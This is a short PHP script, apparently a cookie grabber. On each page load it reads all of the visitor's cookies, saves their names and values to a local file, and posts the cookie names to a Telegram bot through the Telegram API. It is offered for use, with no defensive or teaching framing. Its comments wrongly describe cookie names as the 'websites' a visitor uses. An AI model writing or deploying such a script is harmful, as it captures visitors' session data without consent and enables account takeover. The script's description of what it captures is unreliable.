<?php
// Get all cookies
$cookies = $_COOKIE;

// Convert cookies array to string with key-value pairs
$cookieString = "";
foreach ($cookies as $name => $value) {
    $cookieString .= "$name=$value; ";
}

// Save the cookie information in a txt file
$file = fopen("collected_cookies.txt", "w");
fwrite($file, $cookieString);
fclose($file);

// Your Telegram bot token and chat ID
$botToken = 'YOUR_BOT_TOKEN';
$chatID = 'YOUR_CHAT_ID';

// Send the cookies to your browser
foreach ($cookies as $name => $value) {
    setcookie($name, $value, time() + 3600); // Expires in 1 hour
}

// Send a Telegram notification with the names of websites
$websiteNames = array_keys($cookies);
$message = "Websites found in the cookies:\n\n" . implode("\n", $websiteNames);
$telegramURL = "https://api.telegram.org/bot{$botToken}/sendMessage";
$postFields = array(
    'chat_id' => $chatID,
    'text' => $message
);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $telegramURL);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result = curl_exec($ch);
curl_close($ch);

echo "Cookies have been collected, added to your browser, and a Telegram notification has been sent with the website names.";
?>
